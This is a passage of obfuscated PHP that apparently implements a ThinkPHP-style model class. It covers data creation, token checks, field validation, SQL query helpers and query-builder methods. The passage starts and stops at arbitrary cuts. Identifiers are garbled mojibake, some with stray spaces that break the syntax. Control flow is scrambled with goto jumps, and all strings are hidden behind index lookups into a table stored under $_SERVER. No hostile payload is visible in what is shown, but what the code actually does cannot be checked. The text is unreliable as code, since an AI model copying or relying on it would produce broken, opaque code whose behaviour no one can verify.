($bö»ä⁄Ñº“ as $eÂ¥ëŸÈõ≤) { $fÜü∫–£èÑ = $eÂ¥ëŸÈõ≤[$Då„≈ñÃóΩ]; if (2 == $aíÉ¢ïõéı) { $aì¯ŒäöÂﬁ[$fÜü∫–£èÑ] = $eÂ¥ëŸÈõ≤[$aàπåïî√é]; } else { $aì¯ŒäöÂﬁ[$fÜü∫–£èÑ] = is_string($Cˆ∑„®Ú“¡) ? implode($Cˆ∑„®Ú“¡, $eÂ¥ëŸÈõ≤) : $eÂ¥ëŸÈõ≤; } } return $aì¯ŒäöÂﬁ; goto däîƒ÷ÇÍ; däîƒ÷ÇÍ: } } else { if (!0 !== $Cˆ∑„®Ú“¡) { $D Ò‰˜ö˘Á[$aÃßÌ†í“å[280]] = is_numeric($Cˆ∑„®Ú“¡) ? $Cˆ∑„®Ú“¡ : 1; } if ($Cˆ∑„®Ú“¡ === $aÃßÌ†í“å[243]) { unset($D Ò‰˜ö˘Á[$aÃßÌ†í“å[280]]); } $eÂ¥ëŸÈõ≤ = $this->db->select($D Ò‰˜ö˘Á); if (!empty($eÂ¥ëŸÈõ≤)) { if ($Cˆ∑„®Ú“¡ === $aÃßÌ†í“å[243]) { return reset($eÂ¥ëŸÈõ≤[0]); } if (!0 !== $Cˆ∑„®Ú“¡ && 1 == $D Ò‰˜ö˘Á[$aÃßÌ†í“å[280]]) { return reset($eÂ¥ëŸÈõ≤[0]); } foreach ($eÂ¥ëŸÈõ≤ as $cÒã¬¯Ü“Î) { $FÈùÌÑÔ”Ã[] = $cÒã¬¯Ü“Î[$eÏ◊ªÀÚÉõ]; } return $FÈùÌÑÔ”Ã; } } return null; } public function create($eÀ™‡¬ÂÙ« = '', $bæ£¯ìÇÈÁ = '') { goto Aπ‚ª´ èä; fÚÒ¨øÎéö: return $eÀ™‡¬ÂÙ«; goto F≈·∑¨ÕÆ√; F—É∆ï“ëá: if ($this->autoCheckFields) { $dô´ŸõÓéâ = $this->getDbFields(); foreach ($eÀ™‡¬ÂÙ« as $B®ÃçÚ¿„Ω => $EÔèΩÃÂÁı) { if (!in_array($B®ÃçÚ¿„Ω, $dô´ŸõÓéâ)) { unset($eÀ™‡¬ÂÙ«[$B®ÃçÚ¿„Ω]); } elseif (MAGIC_QUOTES_GPC && is_string($EÔèΩÃÂÁı)) { $eÀ™‡¬ÂÙ«[$B®ÃçÚ¿„Ω] = stripslashes($EÔèΩÃÂÁı); } } } $this->autoOperation($eÀ™‡¬ÂÙ«, $bæ£¯ìÇÈÁ); $this->data = $eÀ™‡¬ÂÙ«; goto fÚÒ¨øÎéö; f∏∆úπÏ§ª: if (isset($dô´ŸõÓéâ)) { if (is_string($dô´ŸõÓéâ)) { $dô´ŸõÓéâ = explode($E‚ƒÜ∫‚ﬂﬁ[47], $dô´ŸõÓéâ); } if (think_config($E‚ƒÜ∫‚ﬂﬁ[286])) { $dô´ŸõÓéâ[] = think_config($E‚ƒÜ∫‚ﬂﬁ[287]); } foreach ($eÀ™‡¬ÂÙ« as $B®ÃçÚ¿„Ω => $EÔèΩÃÂÁı) { if (!in_array($B®ÃçÚ¿„Ω, $dô´ŸõÓéâ)) { unset($eÀ™‡¬ÂÙ«[$B®ÃçÚ¿„Ω]); } } } if (!$this->autoValidation($eÀ™‡¬ÂÙ«, $bæ£¯ìÇÈÁ)) { return !1; } if (!$this->autoCheckToken($eÀ™‡¬ÂÙ«)) { $this->error = think_lang($E‚ƒÜ∫‚ﬂﬁ[288]); return !1; } goto F—É∆ï“ëá; Aπ‚ª´ èä: $E‚ƒÜ∫‚ﬂﬁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($eÀ™‡¬ÂÙ«)) { $eÀ™‡¬ÂÙ« = $_POST; } elseif (is_object($eÀ™‡¬ÂÙ«)) { $eÀ™‡¬ÂÙ« = get_object_vars($eÀ™‡¬ÂÙ«); } if (empty($eÀ™‡¬ÂÙ«) || !is_array($eÀ™‡¬ÂÙ«)) { $this->error = think_lang($E‚ƒÜ∫‚ﬂﬁ[259]); return !1; } goto d≠ÿ˜ûﬁÀï; d≠ÿ˜ûﬁÀï: $eÀ™‡¬ÂÙ« = $this->parseFieldsMap($eÀ™‡¬ÂÙ«, 0); $bæ£¯ìÇÈÁ = $bæ£¯ìÇÈÁ ? $bæ£¯ìÇÈÁ : (!empty($eÀ™‡¬ÂÙ«[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$E‚ƒÜ∫‚ﬂﬁ[261]])) { $dô´ŸõÓéâ = $this->options[$E‚ƒÜ∫‚ﬂﬁ[261]]; unset($this->options[$E‚ƒÜ∫‚ﬂﬁ[261]]); } elseif ($bæ£¯ìÇÈÁ == THINK_MODEL_INSERT && isset($this->insertFields)) { $dô´ŸõÓéâ = $this->insertFields; } elseif ($bæ£¯ìÇÈÁ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $dô´ŸõÓéâ = $this->updateFields; } goto f∏∆úπÏ§ª; F≈·∑¨ÕÆ√: } public function autoCheckToken($D÷Ñ¯úüü≤) { $dª£Ë™ª¿ò =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($this->options[$dª£Ë™ª¿ò[289]]) && !$this->options[$dª£Ë™ª¿ò[289]]) { return !0; } if (think_config($dª£Ë™ª¿ò[286])) { $c√ëÃø∆Æè = think_config($dª£Ë™ª¿ò[287]); if (!isset($D÷Ñ¯úüü≤[$c√ëÃø∆Æè]) || Session::get($c√ëÃø∆Æè)) { return !1; } list($BÉÜ“˜ı¯ﬂ, $FìôÕ¬Ñ‰ê) = explode($dª£Ë™ª¿ò[70], $D÷Ñ¯úüü≤[$c√ëÃø∆Æè]); if ($FìôÕ¬Ñ‰ê && Session::get($c√ëÃø∆Æè . $dª£Ë™ª¿ò[91] . $BÉÜ“˜ı¯ﬂ) === $FìôÕ¬Ñ‰ê) { Session::remove($c√ëÃø∆Æè . $dª£Ë™ª¿ò[91] . $BÉÜ“˜ı¯ﬂ); return !0; } if (think_config($dª£Ë™ª¿ò[290])) { Session::remove($c√ëÃø∆Æè . $dª£Ë™ª¿ò[91] . $BÉÜ“˜ı¯ﬂ); } return !1; } return !0; } public function regex($e≤úŒùŸëÖ, $bÑª‘¶‹ƒã) { $cëü´Ó”¬≈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CàÈ·ñâøÿ = array($cëü´Ó”¬≈[291] => $cëü´Ó”¬≈[292], $cëü´Ó”¬≈[293] => $cëü´Ó”¬≈[294], $cëü´Ó”¬≈[295] => $cëü´Ó”¬≈[296], $cëü´Ó”¬≈[297] => $cëü´Ó”¬≈[298], $cëü´Ó”¬≈[299] => $cëü´Ó”¬≈[300], $cëü´Ó”¬≈[301] => $cëü´Ó”¬≈[302], $cëü´Ó”¬≈[303] => $cëü´Ó”¬≈[304], $cëü´Ó”¬≈[278] => $cëü´Ó”¬≈[305], $cëü´Ó”¬≈[306] => $cëü´Ó”¬≈[307]); if (isset($CàÈ·ñâøÿ[strtolower($bÑª‘¶‹ƒã)])) { $bÑª‘¶‹ƒã = $CàÈ·ñâøÿ[strtolower($bÑª‘¶‹ƒã)]; } return preg_match($bÑª‘¶‹ƒã, $e≤úŒùŸëÖ) === 1; } private function autoOperation(&$dÈ¬ïÂƒÓ‹, $Dÿ–úƒ˜»Ø) { $B∫ôÃÿÃí  =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!empty($this->options[$B∫ôÃÿÃí [308]])) { $e—úíé§Ö∆ = $this->options[$B∫ôÃÿÃí [308]]; unset($this->options[$B∫ôÃÿÃí [308]]); } elseif (!empty($this->_auto)) { $e—úíé§Ö∆ = $this->_auto; } if (isset($e—úíé§Ö∆)) { foreach ($e—úíé§Ö∆ as $C˜ƒ°◊Òè‹) { if (empty($C˜ƒ°◊Òè‹[2])) { $C˜ƒ°◊Òè‹[2] = THINK_MODEL_INSERT; } if ($Dÿ–úƒ˜»Ø == $C˜ƒ°◊Òè‹[2] || $C˜ƒ°◊Òè‹[2] == THINK_MODEL_BOTH) { switch (trim($C˜ƒ°◊Òè‹[3])) { case $B∫ôÃÿÃí [309]: case $B∫ôÃÿÃí [310]: $eßÁÕ©§Ö∫ = isset($C˜ƒ°◊Òè‹[4]) ? (array) $C˜ƒ°◊Òè‹[4] : array(); if (isset($dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]])) { array_unshift($eßÁÕ©§Ö∫, $dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]]); } if ($B∫ôÃÿÃí [309] == $C˜ƒ°◊Òè‹[3]) { $dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]] = call_user_func_array($C˜ƒ°◊Òè‹[1], $eßÁÕ©§Ö∫); } else { $dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]] = call_user_func_array(array(&$this, $C˜ƒ°◊Òè‹[1]), $eßÁÕ©§Ö∫); } break; case $B∫ôÃÿÃí [261]: $dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]] = $dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[1]]; break; case $B∫ôÃÿÃí [311]: if ($B∫ôÃÿÃí [33] === $dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]]) { unset($dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]]); } break; case $B∫ôÃÿÃí [312]: default: $dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]] = $C˜ƒ°◊Òè‹[1]; } if (!1 === $dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]]) { unset($dÈ¬ïÂƒÓ‹[$C˜ƒ°◊Òè‹[0]]); } } } } return $dÈ¬ïÂƒÓ‹; } protected function autoValidation($aáè∫Ãûë◊, $A⁄ŸÂ¯·∫ÿ) { $bÖ™∂πÛÀ‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!empty($this->options[$bÖ™∂πÛÀ‹[313]])) { $FãÎ®Ùê°  = $this->options[$bÖ™∂πÛÀ‹[313]]; unset($this->options[$bÖ™∂πÛÀ‹[313]]); } elseif (!empty($this->_validate)) { $FãÎ®Ùê°  = $this->_validate; } if (isset($FãÎ®Ùê° )) { if ($this->patchValidate) { $this->error = array(); } foreach ($FãÎ®Ùê°  as $Døàã∂®∑“ => $cŸ∑Ì¥—ˆ±) { if (empty($cŸ∑Ì¥—ˆ±[5]) || $cŸ∑Ì¥—ˆ±[5] == THINK_MODEL_BOTH || $cŸ∑Ì¥—ˆ±[5] == $A⁄ŸÂ¯·∫ÿ) { if (0 == strpos($cŸ∑Ì¥—ˆ±[2], $bÖ™∂πÛÀ‹[314]) && strpos($cŸ∑Ì¥—ˆ±[2], $bÖ™∂πÛÀ‹[315])) { $cŸ∑Ì¥—ˆ±[2] = think_lang(substr($cŸ∑Ì¥—ˆ±[2], 2, -1)); } $cŸ∑Ì¥—ˆ±[3] = isset($cŸ∑Ì¥—ˆ±[3]) ? $cŸ∑Ì¥—ˆ±[3] : THINK_EXISTS_VALIDATE; $cŸ∑Ì¥—ˆ±[4] = isset($cŸ∑Ì¥—ˆ±[4]) ? $cŸ∑Ì¥—ˆ±[4] : $bÖ™∂πÛÀ‹[316]; switch ($cŸ∑Ì¥—ˆ±[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($aáè∫Ãûë◊, $cŸ∑Ì¥—ˆ±)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($bÖ™∂πÛÀ‹[33] != trim($aáè∫Ãûë◊[$cŸ∑Ì¥—ˆ±[0]])) { if (!1 === $this->_validationField($aáè∫Ãûë◊, $cŸ∑Ì¥—ˆ±)) { return !1; } } break; default: if (isset($aáè∫Ãûë◊[$cŸ∑Ì¥—ˆ±[0]])) { if (!1 === $this->_validationField($aáè∫Ãûë◊, $cŸ∑Ì¥—ˆ±)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($dß¶Ñ À“à, $b ªéºÊÖÚ) { if (!1 === $this->_validationFieldItem($dß¶Ñ À“à, $b ªéºÊÖÚ)) { if ($this->patchValidate) { $this->error[$b ªéºÊÖÚ[0]] = $b ªéºÊÖÚ[2]; } else { $this->error = $b ªéºÊÖÚ[2]; return !1; } } return; } protected function _validationFieldItem($AÛ©çØ€Ïç, $Aæ§£˜Âï‹) { $BÚÒÀîŒÀ˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; switch (strtolower(trim($Aæ§£˜Âï‹[4]))) { case $BÚÒÀîŒÀ˜[309]: case $BÚÒÀîŒÀ˜[310]: $eˆ∫Çñ“…€ = isset($Aæ§£˜Âï‹[6]) ? (array) $Aæ§£˜Âï‹[6] : array(); if (is_string($Aæ§£˜Âï‹[0]) && strpos($Aæ§£˜Âï‹[0], $BÚÒÀîŒÀ˜[47])) { $Aæ§£˜Âï‹[0] = explode($BÚÒÀîŒÀ˜[47], $Aæ§£˜Âï‹[0]); } if (is_array($Aæ§£˜Âï‹[0])) { foreach ($Aæ§£˜Âï‹[0] as $cï‰Ø™≈›˜) { $cÍÎÉ¿Á¨ç[$cï‰Ø™≈›˜] = $AÛ©çØ€Ïç[$cï‰Ø™≈›˜]; } array_unshift($eˆ∫Çñ“…€, $cÍÎÉ¿Á¨ç); } else { array_unshift($eˆ∫Çñ“…€, $AÛ©çØ€Ïç[$Aæ§£˜Âï‹[0]]); } if ($BÚÒÀîŒÀ˜[309] == $Aæ§£˜Âï‹[4]) { return call_user_func_array($Aæ§£˜Âï‹[1], $eˆ∫Çñ“…€); } else { return call_user_func_array(array(&$this, $Aæ§£˜Âï‹[1]), $eˆ∫Çñ“…€); } case $BÚÒÀîŒÀ˜[317]: return $AÛ©çØ€Ïç[$Aæ§£˜Âï‹[0]] == $AÛ©çØ€Ïç[$Aæ§£˜Âï‹[1]]; case $BÚÒÀîŒÀ˜[318]: if (is_string($Aæ§£˜Âï‹[0]) && strpos($Aæ§£˜Âï‹[0], $BÚÒÀîŒÀ˜[47])) { $Aæ§£˜Âï‹[0] = explode($BÚÒÀîŒÀ˜[47], $Aæ§£˜Âï‹[0]); } $aÉ≤ı≠ÊÉà = array(); if (is_array($Aæ§£˜Âï‹[0])) { foreach ($Aæ§£˜Âï‹[0] as $cï‰Ø™≈›˜) { $aÉ≤ı≠ÊÉà[$cï‰Ø™≈›˜] = $AÛ©çØ€Ïç[$cï‰Ø™≈›˜]; } } else { $aÉ≤ı≠ÊÉà[$Aæ§£˜Âï‹[0]] = $AÛ©çØ€Ïç[$Aæ§£˜Âï‹[0]]; } if (!empty($AÛ©çØ€Ïç[$this->getPk()])) { $aÉ≤ı≠ÊÉà[$this->getPk()] = array($BÚÒÀîŒÀ˜[319], $AÛ©çØ€Ïç[$this->getPk()]); } if ($this->where($aÉ≤ı≠ÊÉà)->find()) { return !1; } return !0; default: return $this->check($AÛ©çØ€Ïç[$Aæ§£˜Âï‹[0]], $Aæ§£˜Âï‹[1], $Aæ§£˜Âï‹[4]); } } public function check($bµåÔá‹∏°, $d¨Á™·¥ú«, $a«†‰ëô’ˆ = "\x72\x65\x67\x65\170") { $D±âøåÛÑ“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a«†‰ëô’ˆ = strtolower(trim($a«†‰ëô’ˆ)); switch ($a«†‰ëô’ˆ) { case $D±âøåÛÑ“[7]: case $D±âøåÛÑ“[320]: $B∆¶∏Œä€ä = is_array($d¨Á™·¥ú«) ? $d¨Á™·¥ú« : explode($D±âøåÛÑ“[47], $d¨Á™·¥ú«); return $a«†‰ëô’ˆ == $D±âøåÛÑ“[7] ? in_array($bµåÔá‹∏°, $B∆¶∏Œä€ä) : !in_array($bµåÔá‹∏°, $B∆¶∏Œä€ä); case $D±âøåÛÑ“[321]: case $D±âøåÛÑ“[322]: if (is_array($d¨Á™·¥ú«)) { $A»Ç±êŒ∂ı = $d¨Á™·¥ú«[0]; $BßıƒÓƒÒâ = $d¨Á™·¥ú«[1]; } else { list($A»Ç±êŒ∂ı, $BßıƒÓƒÒâ) = explode($D±âøåÛÑ“[47], $d¨Á™·¥ú«); } return $a«†‰ëô’ˆ == $D±âøåÛÑ“[321] ? $bµåÔá‹∏° >= $A»Ç±êŒ∂ı && $bµåÔá‹∏° <= $BßıƒÓƒÒâ : $bµåÔá‹∏° < $A»Ç±êŒ∂ı || $bµåÔá‹∏° > $BßıƒÓƒÒâ; case $D±âøåÛÑ“[323]: case $D±âøåÛÑ“[324]: return $a«†‰ëô’ˆ == $D±âøåÛÑ“[323] ? $bµåÔá‹∏° == $d¨Á™·¥ú« : $bµåÔá‹∏° != $d¨Á™·¥ú«; case $D±âøåÛÑ“[325]: $aÏÕê≤»’Ù = mb_strlen($bµåÔá‹∏°, $D±âøåÛÑ“[326]); if (strpos($d¨Á™·¥ú«, $D±âøåÛÑ“[47])) { list($A»Ç±êŒ∂ı, $BßıƒÓƒÒâ) = explode($D±âøåÛÑ“[47], $d¨Á™·¥ú«); return $aÏÕê≤»’Ù >= $A»Ç±êŒ∂ı && $aÏÕê≤»’Ù <= $BßıƒÓƒÒâ; } else { return $aÏÕê≤»’Ù == $d¨Á™·¥ú«; } case $D±âøåÛÑ“[327]: list($Aî≠áá£Ö¥, $e¬¶ë÷÷ãÉ) = explode($D±âøåÛÑ“[47], $d¨Á™·¥ú«); if (!is_numeric($Aî≠áá£Ö¥)) { $Aî≠áá£Ö¥ = strtotime($Aî≠áá£Ö¥); } if (!is_numeric($e¬¶ë÷÷ãÉ)) { $e¬¶ë÷÷ãÉ = strtotime($e¬¶ë÷÷ãÉ); } return NOW_TIME >= $Aî≠áá£Ö¥ && NOW_TIME <= $e¬¶ë÷÷ãÉ; case $D±âøåÛÑ“[328]: return in_array(get_client_ip(), explode($D±âøåÛÑ“[47], $d¨Á™·¥ú«)); case $D±âøåÛÑ“[329]: return !in_array(get_client_ip(), explode($D±âøåÛÑ“[47], $d¨Á™·¥ú«)); case $D±âøåÛÑ“[316]: default: return $this->regex($bµåÔá‹∏°, $d¨Á™·¥ú«); } } public function query($eÜ‹¨Æ¶§ª, $d∞…ﬂâŸ≤¢ = false) { $FÔÇçµÎ®‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!is_bool($d∞…ﬂâŸ≤¢) && !is_array($d∞…ﬂâŸ≤¢)) { $d∞…ﬂâŸ≤¢ = func_get_args(); array_shift($d∞…ﬂâŸ≤¢); } $eÜ‹¨Æ¶§ª = str_replace(array($FÔÇçµÎ®‘[217], $FÔÇçµÎ®‘[330]), $FÔÇçµÎ®‘[50], $eÜ‹¨Æ¶§ª); $eÜ‹¨Æ¶§ª = $this->parseSql($eÜ‹¨Æ¶§ª, $d∞…ﬂâŸ≤¢); return $this->db->query($eÜ‹¨Æ¶§ª); } public function execute($C◊â¿èÑÎß, $D£ÜûÓ”“§ = false) { if (!is_bool($D£ÜûÓ”“§) && !is_array($D£ÜûÓ”“§)) { $D£ÜûÓ”“§ = func_get_args(); array_shift($D£ÜûÓ”“§); } $C◊â¿èÑÎß = $this->parseSql($C◊â¿èÑÎß, $D£ÜûÓ”“§); return $this->db->execute($C◊â¿èÑÎß); } protected function parseSql($e¢´…Æ¬ÿÀ, $aå‰◊Ëı†≥) { $eüƒ‘Ê†Ùã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!0 === $aå‰◊Ëı†≥) { $fŒ≈•íû¢∫ = $this->_parseOptions(); $e¢´…Æ¬ÿÀ = $this->db->parseSql($e¢´…Æ¬ÿÀ, $fŒ≈•íû¢∫); } elseif (is_array($aå‰◊Ëı†≥)) { $aå‰◊Ëı†≥ = array_map(array($this->db, $eüƒ‘Ê†Ùã[331]), $aå‰◊Ëı†≥); $e¢´…Æ¬ÿÀ = vsprintf($e¢´…Æ¬ÿÀ, $aå‰◊Ëı†≥); } else { $e¢´…Æ¬ÿÀ = strtr($e¢´…Æ¬ÿÀ, array($eüƒ‘Ê†Ùã[332] => $this->getTableName(), $eüƒ‘Ê†Ùã[333] => think_config($eüƒ‘Ê†Ùã[232]))); } $this->db->setModel($this->name); return $e¢´…Æ¬ÿÀ; } public function db($c”‡ñ”ƒ£¿ = '', $A†“À§ﬂª≤ = '', $E‚ä∏üßı« = array()) { goto AÜŒ∑÷™ì°; Cëˆ‹«“¬˜: static $BÂÁëÆù’Ñ = array(); if (!isset($BÂÁëÆù’Ñ[$c”‡ñ”ƒ£¿]) || isset($BÂÁëÆù’Ñ[$c”‡ñ”ƒ£¿]) && $A†“À§ﬂª≤ && $b›Á∑≈°»Ë[$c”‡ñ”ƒ£¿] != $A†“À§ﬂª≤) { if (!empty($A†“À§ﬂª≤) && is_string($A†“À§ﬂª≤) && !1 === strpos($A†“À§ﬂª≤, $AßÑíí¬Æ¢[8])) { $A†“À§ﬂª≤ = think_config($A†“À§ﬂª≤); } $BÂÁëÆù’Ñ[$c”‡ñ”ƒ£¿] = Db::getInstance($A†“À§ﬂª≤); } elseif (NULL === $A†“À§ﬂª≤) { $BÂÁëÆù’Ñ[$c”‡ñ”ƒ£¿]->close(); unset($BÂÁëÆù’Ñ[$c”‡ñ”ƒ£¿]); return; } if (!empty($E‚ä∏üßı«)) { if (is_string($E‚ä∏üßı«)) { parse_str($E‚ä∏üßı«, $E‚ä∏üßı«); } foreach ($E‚ä∏üßı« as $E±åóêÌ·› => $Eò›⁄‰“Ê¶) { $this->setProperty($E±åóêÌ·›, $Eò›⁄‰“Ê¶); } } goto b«Ÿ—Ÿπ∆±; b«Ÿ—Ÿπ∆±: $b›Á∑≈°»Ë[$c”‡ñ”ƒ£¿] = $A†“À§ﬂª≤; $this->db = $BÂÁëÆù’Ñ[$c”‡ñ”ƒ£¿]; $this->_after_db(); goto Bï◊¡è≈„ö; AÜŒ∑÷™ì°: $AßÑíí¬Æ¢ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($AßÑíí¬Æ¢[33] === $c”‡ñ”ƒ£¿ && $this->db) { return $this->db; } static $b›Á∑≈°»Ë = array(); goto Cëˆ‹«“¬˜; Bï◊¡è≈„ö: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto D»–©¬ìÒ«; D»–©¬ìÒ«: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $AÛÍ˘∞®Çπ = get_class($this); if ($AÛÍ˘∞®Çπ == $_SERVER[Ä¿¡‡öóµŸﬂ‡][334]) { return $this->name; } $this->name = substr($AÛÍ˘∞®Çπ, 0, -5); } return $this->name; } public function getTableName() { $c†ˆﬂ“¡®ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($this->trueTableName)) { $eíäç’∏„Ë = !empty($this->tablePrefix) ? $this->tablePrefix : $c†ˆﬂ“¡®ÿ[33]; if (!empty($this->tableName)) { $eíäç’∏„Ë .= $this->tableName; } else { $eíäç’∏„Ë .= think_parse_name($this->name); } $this->trueTableName = strtolower($eíäç’∏„Ë); } return (!empty($this->dbName) ? $this->dbName . $c†ˆﬂ“¡®ÿ[91] : $c†ˆﬂ“¡®ÿ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Bﬂ„ÍÎ≠¬  =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return isset($this->fields[$Bﬂ„ÍÎ≠¬ [239]]) ? $this->fields[$Bﬂ„ÍÎ≠¬ [239]] : $this->pk; } public function getDbFields() { $a◊º¨•Ÿñ¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($this->options[$a◊º¨•Ÿñ¥[267]])) { $F«€Ë€∏ä‡ = $this->db->getFields($this->options[$a◊º¨•Ÿñ¥[267]]); return $F«€Ë€∏ä‡ ? array_keys($F«€Ë€∏ä‡) : !1; } if ($this->fields) { $F«€Ë€∏ä‡ = $this->fields; unset($F«€Ë€∏ä‡[$a◊º¨•Ÿñ¥[238]], $F«€Ë€∏ä‡[$a◊º¨•Ÿñ¥[239]], $F«€Ë€∏ä‡[$a◊º¨•Ÿñ¥[240]], $F«€Ë€∏ä‡[$a◊º¨•Ÿñ¥[237]]); return $F«€Ë€∏ä‡; } return !1; } public function data($fœ≠ÈÔŒÁç = '') { $Aêˆ‰∫§ñ• =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($Aêˆ‰∫§ñ•[33] === $fœ≠ÈÔŒÁç && !empty($this->data)) { return $this->data; } if (is_object($fœ≠ÈÔŒÁç)) { $fœ≠ÈÔŒÁç = get_object_vars($fœ≠ÈÔŒÁç); } elseif (is_string($fœ≠ÈÔŒÁç)) { parse_str($fœ≠ÈÔŒÁç, $fœ≠ÈÔŒÁç); } elseif (!is_array($fœ≠ÈÔŒÁç)) { think_exception(think_lang($Aêˆ‰∫§ñ•[259])); } $this->data = $fœ≠ÈÔŒÁç; return $this; } public function join($BõÑ©ƒÚ€±) { $d∏µÁ∂À‹˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_array($BõÑ©ƒÚ€±)) { $this->options[$d∏µÁ∂À‹˘[270]] = $BõÑ©ƒÚ€±; } elseif (!empty($BõÑ©ƒÚ€±)) { $this->options[$d∏µÁ∂À‹˘[270]][] = $BõÑ©ƒÚ€±; } return $this; } public function union($FâœÔë™õ≈, $c¯–Ù˘≤∆— = false) { goto eéÑ¢≤∑Ñ∑; eéÑ¢≤∑Ñ∑: $AÈÕ¨∆ƒÖë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($FâœÔë™õ≈)) { return $this; } if ($c¯–Ù˘≤∆—) { $this->options[$AÈÕ¨∆ƒÖë[335]][$AÈÕ¨∆ƒÖë[336]] = !0; } goto a‚›Ç≥µ•ó; D∂¿√ˆï¯Õ: return $this; goto dâõ¶êäÙ; a‚›Ç≥µ•ó: if (is_object($FâœÔë™õ≈)) { $FâœÔë™õ≈ = get_object_vars($FâœÔë™õ≈); } if (is_string($FâœÔë™õ≈)) { $B”∏§ê¯ Ω = $FâœÔë™õ≈; } elseif (is_array($FâœÔë™õ≈)) { if (isset($FâœÔë™õ≈[0])) { $this->options[$AÈÕ¨∆ƒÖë[335]] = array_merge($this->options[$AÈÕ¨∆ƒÖë[335]], $FâœÔë™õ≈); return $this; } else { $B”∏§ê¯ Ω = $FâœÔë™õ≈; } } else { think_exception(think_lang($AÈÕ¨∆ƒÖë[259])); } $this->options[$AÈÕ¨∆ƒÖë[335]][] = $B”∏§ê¯ Ω; goto D∂¿√ˆï¯Õ; dâõ¶êäÙ: } public function cache($a‹™“†ü⁄„ = true, $EÑÉ‡é≈Êã = null, $bµ¢´πßäç = '') { $eêô¨øÆ‹≤ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!1 !== $a‹™“†ü⁄„) { $this->options[$eêô¨øÆ‹≤[337]] = array($eêô¨øÆ‹≤[89] => $a‹™“†ü⁄„, $eêô¨øÆ‹≤[327] => $EÑÉ‡é≈Êã, $eêô¨øÆ‹≤[29] => $bµ¢´πßäç); } return $this; } public function field($BóÖ¿≠◊ãû, $EñÚß≥ÜïÕ = false) { $Bî≥êÂõ™€ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!0 === $BóÖ¿≠◊ãû) { $cÙòÏ…™ø = $this->getDbFields(); $BóÖ¿≠◊ãû = $cÙòÏ…™ø ? $cÙòÏ…™ø : $Bî≥êÂõ™€[176]; } elseif ($EñÚß≥ÜïÕ) { if (is_string($BóÖ¿≠◊ãû)) { $BóÖ¿≠◊ãû = explode($Bî≥êÂõ™€[47], $BóÖ¿≠◊ãû); } $cÙòÏ…™ø = $this->getDbFields(); $BóÖ¿≠◊ãû = $cÙòÏ…™ø ? array_diff($cÙòÏ…™ø, $BóÖ¿≠◊ãû) : $BóÖ¿≠◊ãû; } $this->options[$Bî≥êÂõ™€[261]] = $BóÖ¿≠◊ãû; return $this; } public function scope($Dè€ÎØ…¿Ü = '', $d›Ø€÷∆∂ = NULL) { $AΩµá≥Ñ∆≠ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($AΩµá≥Ñ∆≠[33] === $Dè€ÎØ…¿Ü) { if (isset($this->_scope[$AΩµá≥Ñ∆≠[34]])) { $f«≠ê±ûàŸ = $this->_scope[$AΩµá≥Ñ∆≠[34]]; } else { return $this; } } elseif (is_string($Dè€ÎØ…¿Ü)) { $Cµóè˜°à∏ = explode($AΩµá≥Ñ∆≠[47], $Dè€ÎØ…¿Ü); $f«≠ê±ûàŸ = array(); foreach ($Cµóè˜°à∏ as $E©πÜø∑®í) { if (!isset($this->_scope[$E©πÜø∑®í])) { continue; } $f«≠ê±ûàŸ = array_merge($f«≠ê±ûàŸ, $this->_scope[$E©πÜø∑®í]); } if (!empty($d›Ø€÷∆∂) && is_array($d›Ø€÷∆∂)) { $f«≠ê±ûàŸ = array_merge($f«≠ê±ûàŸ, $d›Ø€÷∆∂); } } elseif (is_array($Dè€ÎØ…¿Ü)) { $f«≠ê±ûàŸ = $Dè€ÎØ…¿Ü; } if (is_array($f«≠ê±ûàŸ) && !empty($f«≠ê±ûàŸ)) { $this->options = array_merge($this->options, array_change_key_case($f«≠ê±ûàŸ)); } return $this; } public function where($a»Ë∞çää“, $eœ¬ç‘ªñÕ = null) { $EØèßíµü¡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if 